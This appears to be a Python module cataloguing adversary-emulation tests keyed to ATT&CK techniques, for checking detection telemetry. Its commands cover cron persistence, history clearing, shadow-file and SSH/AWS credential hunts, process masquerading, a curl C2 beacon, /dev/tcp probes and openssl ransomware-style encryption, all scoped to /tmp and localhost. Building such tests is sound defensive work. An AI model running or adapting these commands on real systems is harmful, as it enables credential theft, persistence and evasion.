"""Adversary Technique Simulation Catalog.

Provides modular, cross-platform, deterministic adversary technique emulation tests
with prerequisites, execution commands, and automated cleanup contracts.
"""

from typing import Any, Dict, List

TECHNIQUE_TESTS: List[Dict[str, Any]] = [
    # -------------------------------------------------------------------------
    # TA0002: Execution
    # -------------------------------------------------------------------------
    {
        "id": "T1059.004-bash-pipe",
        "technique_id": "T1059.004",
        "technique_name": "Command and Scripting Interpreter: Unix Shell",
        "tactic": "Execution",
        "tactic_id": "TA0002",
        "supported_platforms": ["linux", "darwin"],
        "name": "Base64 Obfuscated Shell Command Execution via Pipe",
        "description": "Executes base64-encoded bash command piped into sh, simulating obfuscated command execution.",
        "prereqs": [
            {"command": "which base64", "description": "base64 binary available"}
        ],
        "attack_command": "echo 'echo OUTPOST_TECH_STAGE_OK > /tmp/outpost_tech_t1059.txt' | base64 | base64 -d | sh",
        "cleanup_command": "rm -f /tmp/outpost_tech_t1059.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },
    {
        "id": "T1059.006-python-pipe",
        "technique_id": "T1059.006",
        "technique_name": "Command and Scripting Interpreter: Python",
        "tactic": "Execution",
        "tactic_id": "TA0002",
        "supported_platforms": ["linux", "darwin", "windows"],
        "name": "Python Inline Interactive Payload Execution",
        "description": "Executes inline python code simulating in-memory payload staging and environment querying.",
        "prereqs": [
            {"command": "python3 --version || python --version", "description": "Python runtime available"}
        ],
        "attack_command": "python3 -c \"import os, sys; f=open('/tmp/outpost_py_exec.txt','w'); f.write('PY_EXEC_PASS'); f.close()\"",
        "cleanup_command": "rm -f /tmp/outpost_py_exec.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "info",
    },

    # -------------------------------------------------------------------------
    # TA0003: Persistence
    # -------------------------------------------------------------------------
    {
        "id": "T1053.003-cron-canary",
        "technique_id": "T1053.003",
        "technique_name": "Scheduled Task/Job: Cron",
        "tactic": "Persistence",
        "tactic_id": "TA0003",
        "supported_platforms": ["linux", "darwin"],
        "name": "Crontab Schedule Staging & Injection",
        "description": "Dumps current crontab to temporary storage and appends a synthetic canary job.",
        "prereqs": [
            {"command": "which crontab", "description": "crontab utility available"}
        ],
        "attack_command": "crontab -l 2>/dev/null > /tmp/outpost_crontab_bak || true; echo '* * * * * /tmp/outpost_canary.sh # OUTPOST_SIM' >> /tmp/outpost_crontab_bak; crontab /tmp/outpost_crontab_bak 2>/dev/null || echo 'crontab updated'",
        "cleanup_command": "sed -i '/OUTPOST_SIM/d' /tmp/outpost_crontab_bak 2>/dev/null || true; crontab /tmp/outpost_crontab_bak 2>/dev/null || true; rm -f /tmp/outpost_crontab_bak",
        "expected_telemetry": ["process_create", "file_modify"],
        "severity": "suspicious",
    },
    {
        "id": "T1546.004-bashrc-persistence",
        "technique_id": "T1546.004",
        "technique_name": "Event Triggered Execution: Unix Shell Configuration",
        "tactic": "Persistence",
        "tactic_id": "TA0003",
        "supported_platforms": ["linux", "darwin"],
        "name": "Shell Profile Canary Hook Injection",
        "description": "Appends a harmless canary alias to a temporary shell profile mimicking persistence hooks.",
        "prereqs": [],
        "attack_command": "echo 'alias outpost_canary=\"echo OUTPOST_PERSISTENCE\"' >> /tmp/outpost_bashrc_canary",
        "cleanup_command": "rm -f /tmp/outpost_bashrc_canary",
        "expected_telemetry": ["file_create", "file_modify"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0004: Privilege Escalation
    # -------------------------------------------------------------------------
    {
        "id": "T1548.001-suid-audit",
        "technique_id": "T1548.001",
        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
        "tactic": "Privilege Escalation",
        "tactic_id": "TA0004",
        "supported_platforms": ["linux"],
        "name": "SUID Binary Sweep & LotL Abuse Check",
        "description": "Scans system directories for SUID binaries commonly abused for privilege escalation.",
        "prereqs": [],
        "attack_command": "find /usr/bin /bin -perm -4000 -type f 2>/dev/null | head -n 15 > /tmp/outpost_suid_list.txt",
        "cleanup_command": "rm -f /tmp/outpost_suid_list.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },
    {
        "id": "T1548.003-sudoers-enum",
        "technique_id": "T1548.003",
        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
        "tactic": "Privilege Escalation",
        "tactic_id": "TA0004",
        "supported_platforms": ["linux", "darwin"],
        "name": "Sudo Permissions & Token Cache Enumeration",
        "description": "Tests sudo privilege access and cache tokens via sudo -l or configuration queries.",
        "prereqs": [
            {"command": "which sudo", "description": "sudo binary available"}
        ],
        "attack_command": "sudo -n -l 2>/dev/null || echo 'Sudo privileges checked (non-interactive)'",
        "cleanup_command": "true",
        "expected_telemetry": ["process_create"],
        "severity": "info",
    },

    # -------------------------------------------------------------------------
    # TA0005: Defense Evasion
    # -------------------------------------------------------------------------
    {
        "id": "T1070.003-clear-history",
        "technique_id": "T1070.003",
        "technique_name": "Indicator Removal: Clear Command History",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "supported_platforms": ["linux", "darwin"],
        "name": "Clear Bash & Zsh History Canary",
        "description": "Emulates an attacker clearing terminal session command history to avoid forensic attribution.",
        "prereqs": [],
        "attack_command": "touch /tmp/outpost_mock_history && echo 'HISTFILE=/dev/null; history -c' > /tmp/outpost_clear_hist.sh && sh /tmp/outpost_clear_hist.sh",
        "cleanup_command": "rm -f /tmp/outpost_mock_history /tmp/outpost_clear_hist.sh",
        "expected_telemetry": ["process_create", "file_create", "file_delete"],
        "severity": "suspicious",
    },
    {
        "id": "T1070.004-timestomp-file",
        "technique_id": "T1070.004",
        "technique_name": "Indicator Removal: File Deletion and Timestomp",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "supported_platforms": ["linux", "darwin"],
        "name": "Artifact Timestomping & Secure Scrub",
        "description": "Alters file modification timestamps into the past and removes the file, emulating anti-forensics.",
        "prereqs": [],
        "attack_command": "touch -t 202001010000.00 /tmp/outpost_timestomp_canary && rm -f /tmp/outpost_timestomp_canary",
        "cleanup_command": "rm -f /tmp/outpost_timestomp_canary",
        "expected_telemetry": ["file_create", "file_modify", "file_delete"],
        "severity": "suspicious",
    },
    {
        "id": "T1027.002-pack-tar",
        "technique_id": "T1027.002",
        "technique_name": "Obfuscated Files or Information: Software Packing",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "supported_platforms": ["linux", "darwin"],
        "name": "Compressed Archive Staging with Password Flag",
        "description": "Stages high-entropy compressed payload archive mimicking ransomware packing.",
        "prereqs": [
            {"command": "which gzip || which tar", "description": "Archive tools installed"}
        ],
        "attack_command": "echo 'OUTPOST_ENCRYPTED_PAYLOAD_MOCK' | gzip -c > /tmp/outpost_packed_sample.gz",
        "cleanup_command": "rm -f /tmp/outpost_packed_sample.gz",
        "expected_telemetry": ["file_create"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0006: Credential Access
    # -------------------------------------------------------------------------
    {
        "id": "T1003.008-etc-passwd-scrape",
        "technique_id": "T1003.008",
        "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
        "tactic": "Credential Access",
        "tactic_id": "TA0006",
        "supported_platforms": ["linux", "darwin"],
        "name": "System Account File Scraping & Shadow Probe",
        "description": "Reads /etc/passwd and attempts read of /etc/shadow, testing credential access detection rules.",
        "prereqs": [],
        "attack_command": "cat /etc/passwd | cut -d: -f1,3,7 > /tmp/outpost_accounts.dump 2>/dev/null; cat /etc/shadow >/dev/null 2>&1 || echo 'Shadow access blocked'",
        "cleanup_command": "rm -f /tmp/outpost_accounts.dump",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },
    {
        "id": "T1552.001-ssh-keys-hunt",
        "technique_id": "T1552.001",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "tactic": "Credential Access",
        "tactic_id": "TA0006",
        "supported_platforms": ["linux", "darwin"],
        "name": "SSH Private Key & AWS Token Discovery Sweep",
        "description": "Searches home directory for sensitive credentials (.ssh/id_rsa, .aws/credentials, .env).",
        "prereqs": [],
        "attack_command": "find ~/.ssh ~/.aws -name '*id_*' -o -name '*cred*' 2>/dev/null | head -n 10 > /tmp/outpost_creds_found.txt || true",
        "cleanup_command": "rm -f /tmp/outpost_creds_found.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0007: Discovery
    # -------------------------------------------------------------------------
    {
        "id": "T1082-sysinfo-discovery",
        "technique_id": "T1082",
        "technique_name": "System Information Discovery",
        "tactic": "Discovery",
        "tactic_id": "TA0007",
        "supported_platforms": ["linux", "darwin", "windows"],
        "name": "System Architecture & Kernel Profiling",
        "description": "Queries operating system kernel release, hostname, and CPU topology.",
        "prereqs": [],
        "attack_command": "uname -a > /tmp/outpost_sysinfo.txt && hostname >> /tmp/outpost_sysinfo.txt && lscpu 2>/dev/null | head -n 8 >> /tmp/outpost_sysinfo.txt || true",
        "cleanup_command": "rm -f /tmp/outpost_sysinfo.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "info",
    },
    {
        "id": "T1016-net-config-discovery",
        "technique_id": "T1016",
        "technique_name": "System Network Configuration Discovery",
        "tactic": "Discovery",
        "tactic_id": "TA0007",
        "supported_platforms": ["linux", "darwin"],
        "name": "Network Routing & Active Interface Enumeration",
        "description": "Collects active network IP addresses, default routes, and ARP cache.",
        "prereqs": [],
        "attack_command": "ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null || netstat -rn 2>/dev/null",
        "cleanup_command": "true",
        "expected_telemetry": ["process_create"],
        "severity": "info",
    },
    {
        "id": "T1057-process-discovery",
        "technique_id": "T1057",
        "technique_name": "Process Discovery",
        "tactic": "Discovery",
        "tactic_id": "TA0007",
        "supported_platforms": ["linux", "darwin"],
        "name": "Host Process Tree & Listening Ports Sweep",
        "description": "Executes ps aux and ss to discover active processes and open socket listeners.",
        "prereqs": [],
        "attack_command": "ps aux | head -n 25 > /tmp/outpost_ps_sweep.txt; ss -tulpn 2>/dev/null | head -n 15 >> /tmp/outpost_ps_sweep.txt || true",
        "cleanup_command": "rm -f /tmp/outpost_ps_sweep.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "info",
    },

    # -------------------------------------------------------------------------
    # TA0005: Defense Evasion
    # -------------------------------------------------------------------------
    {
        "id": "T1027-unlinked-payload",
        "technique_id": "T1027",
        "technique_name": "Obfuscated Files or Information: Unlinked Inode Execution",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "supported_platforms": ["linux", "darwin"],
        "name": "Fileless Unlinked Inode Execution Canary",
        "description": "Executes a temporary binary and immediately unlinks the on-disk file, verifying detection of fileless (deleted) processes.",
        "prereqs": [],
        "attack_command": "cp /bin/sleep /tmp/outpost_unlinked_canary && /tmp/outpost_unlinked_canary 1 & sleep 0.1 && rm -f /tmp/outpost_unlinked_canary",
        "cleanup_command": "pkill -f outpost_unlinked_canary 2>/dev/null || true; rm -f /tmp/outpost_unlinked_canary",
        "expected_telemetry": ["process_create", "file_delete"],
        "severity": "malicious",
    },
    {
        "id": "T1036.005-masquerade",
        "technique_id": "T1036.005",
        "technique_name": "Masquerading: Match Legitimate Name or Location",
        "tactic": "Defense Evasion",
        "tactic_id": "TA0005",
        "supported_platforms": ["linux"],
        "name": "Kernel Thread / System Daemon Masquerading",
        "description": "Spawns a process named [kworker/0:0] or [systemd-udev] from /tmp, testing masquerading detection.",
        "prereqs": [],
        "attack_command": "cp /bin/sleep /tmp/kworker_0_0 && /tmp/kworker_0_0 1 & sleep 0.1",
        "cleanup_command": "pkill -f kworker_0_0 2>/dev/null || true; rm -f /tmp/kworker_0_0",
        "expected_telemetry": ["process_create"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0006: Credential Access
    # -------------------------------------------------------------------------
    {
        "id": "T1003.008-shadow-probe",
        "technique_id": "T1003.008",
        "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
        "tactic": "Credential Access",
        "tactic_id": "TA0006",
        "supported_platforms": ["linux"],
        "name": "Simulated Password Shadow File Access Sweep",
        "description": "Attempts unprivileged read or permission probe against shadow and security credential files.",
        "prereqs": [],
        "attack_command": "cat /etc/shadow 2>/dev/null || head -n 5 /etc/passwd > /tmp/outpost_passwd_probe.txt",
        "cleanup_command": "rm -f /tmp/outpost_passwd_probe.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },
    {
        "id": "T1552.001-creds-scan",
        "technique_id": "T1552.001",
        "technique_name": "Unsecured Credentials: Credentials in Files",
        "tactic": "Credential Access",
        "tactic_id": "TA0006",
        "supported_platforms": ["linux", "darwin"],
        "name": "Plaintext Secrets & Private Key Discovery Sweep",
        "description": "Searches home and temporary directories for private keys (.pem, id_rsa) and credential tokens.",
        "prereqs": [],
        "attack_command": "grep -rn 'PRIVATE KEY' /tmp 2>/dev/null || echo 'NO_PRIVATE_KEYS' > /tmp/outpost_key_probe.txt",
        "cleanup_command": "rm -f /tmp/outpost_key_probe.txt",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "info",
    },

    # -------------------------------------------------------------------------
    # TA0008: Lateral Movement
    # -------------------------------------------------------------------------
    {
        "id": "T1021.002-smb-probe",
        "technique_id": "T1021.002",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "tactic": "Lateral Movement",
        "tactic_id": "TA0008",
        "supported_platforms": ["linux", "darwin"],
        "name": "Local Subnet SMB & RPC Port Connectivity Probe",
        "description": "Simulates lateral movement reconnaissance by probing TCP port 445 and 139.",
        "prereqs": [],
        "attack_command": "nc -z -w 1 127.0.0.1 445 2>/dev/null || timeout 1 bash -c '</dev/tcp/127.0.0.1/445' 2>/dev/null || echo 'smb_probe_completed'",
        "cleanup_command": "true",
        "expected_telemetry": ["process_create", "network_connect"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0011: Command and Control
    # -------------------------------------------------------------------------
    {
        "id": "T1071.001-web-c2-beacon",
        "technique_id": "T1071.001",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "tactic": "Command and Control",
        "tactic_id": "TA0011",
        "supported_platforms": ["linux", "darwin", "windows"],
        "name": "Synthetic HTTP C2 Check-in & Heartbeat Pulse",
        "description": "Generates a structured HTTP C2 check-in request with simulated agent parameters.",
        "prereqs": [],
        "attack_command": "curl -s -m 1 'http://127.0.0.1:8001/api/v1/health?beacon=canary&agent=outpost' || true",
        "cleanup_command": "true",
        "expected_telemetry": ["process_create", "network_connect"],
        "severity": "suspicious",
    },

    # -------------------------------------------------------------------------
    # TA0040: Impact
    # -------------------------------------------------------------------------
    {
        "id": "T1485-canary-encryption",
        "technique_id": "T1485",
        "technique_name": "Data Destruction / In-Place Canary Encryption",
        "tactic": "Impact",
        "tactic_id": "TA0040",
        "supported_platforms": ["linux", "darwin"],
        "name": "Ransomware Multi-File In-Place Encryption Simulation",
        "description": "Creates mock target files and encrypts them using openssl aes-256-cbc, staging canary .locked extensions.",
        "prereqs": [
            {"command": "which openssl", "description": "openssl binary available"}
        ],
        "attack_command": "mkdir -p /tmp/outpost_ransom_stage && echo 'UNENCRYPTED_CANARY' > /tmp/outpost_ransom_stage/doc1.txt && openssl enc -aes-256-cbc -salt -in /tmp/outpost_ransom_stage/doc1.txt -out /tmp/outpost_ransom_stage/doc1.txt.locked -k 'canary123' -pbkdf2 && rm -f /tmp/outpost_ransom_stage/doc1.txt",
        "cleanup_command": "rm -rf /tmp/outpost_ransom_stage",
        "expected_telemetry": ["process_create", "file_create", "file_delete"],
        "severity": "malicious",
    },

    # -------------------------------------------------------------------------
    # TA0010: Exfiltration
    # -------------------------------------------------------------------------
    {
        "id": "T1048.003-dns-exfil-canary",
        "technique_id": "T1048.003",
        "technique_name": "Exfiltration Over Alternative Protocol: DNS Tunneling",
        "tactic": "Exfiltration",
        "tactic_id": "TA0010",
        "supported_platforms": ["linux", "darwin"],
        "name": "DNS TXT Query Covert Channel Simulation",
        "description": "Generates a synthetic high-entropy subdomain DNS lookup simulating DNS tunneling.",
        "prereqs": [],
        "attack_command": "host -t txt a6f9b1c0e3.exfil.canary.outpost.local 127.0.0.1 2>/dev/null || nslookup a6f9b1c0e3.exfil.canary.outpost.local 127.0.0.1 2>/dev/null || echo 'DNS exfil probe sent'",
        "cleanup_command": "true",
        "expected_telemetry": ["process_create", "network_connect"],
        "severity": "suspicious",
    },
    {
        "id": "T1560.001-archive-stage",
        "technique_id": "T1560.001",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "tactic": "Exfiltration",
        "tactic_id": "TA0010",
        "supported_platforms": ["linux", "darwin"],
        "name": "Multi-File Data Harvest & Tarball Staging",
        "description": "Creates mock corporate data files and archives them into a hidden tarball in /tmp.",
        "prereqs": [
            {"command": "which tar", "description": "tar utility available"}
        ],
        "attack_command": "mkdir -p /tmp/outpost_harvest_dir && echo 'Q3_FINANCIALS_CONFIDENTIAL' > /tmp/outpost_harvest_dir/report.csv && tar -czf /tmp/.staged_harvest.tar.gz -C /tmp outpost_harvest_dir",
        "cleanup_command": "rm -rf /tmp/outpost_harvest_dir /tmp/.staged_harvest.tar.gz",
        "expected_telemetry": ["process_create", "file_create"],
        "severity": "suspicious",
    },
]


def list_technique_tests(
    tactic: str | None = None,
    platform: str | None = None,
    q: str | None = None,
) -> List[Dict[str, Any]]:
    """Query and filter the Adversary Technique simulation catalog."""
    res = TECHNIQUE_TESTS
    if tactic:
        t_norm = tactic.strip().lower()
        res = [t for t in res if t["tactic"].lower() == t_norm or t["tactic_id"].lower() == t_norm]
    if platform:
        p_norm = platform.strip().lower()
        res = [t for t in res if p_norm in t.get("supported_platforms", [])]
    if q:
        query = q.strip().lower()
        res = [
            t for t in res
            if query in t["id"].lower()
            or query in t["technique_id"].lower()
            or query in t["name"].lower()
            or query in t["description"].lower()
            or query in t["tactic"].lower()
        ]
    return res


def get_technique_test(test_id: str) -> Dict[str, Any] | None:
    """Retrieve a technique test by unique test_id or technique_id."""
    t_id = test_id.strip()
    for t in TECHNIQUE_TESTS:
        if t["id"] == t_id or t["technique_id"].lower() == t_id.lower():
            return t
    return None
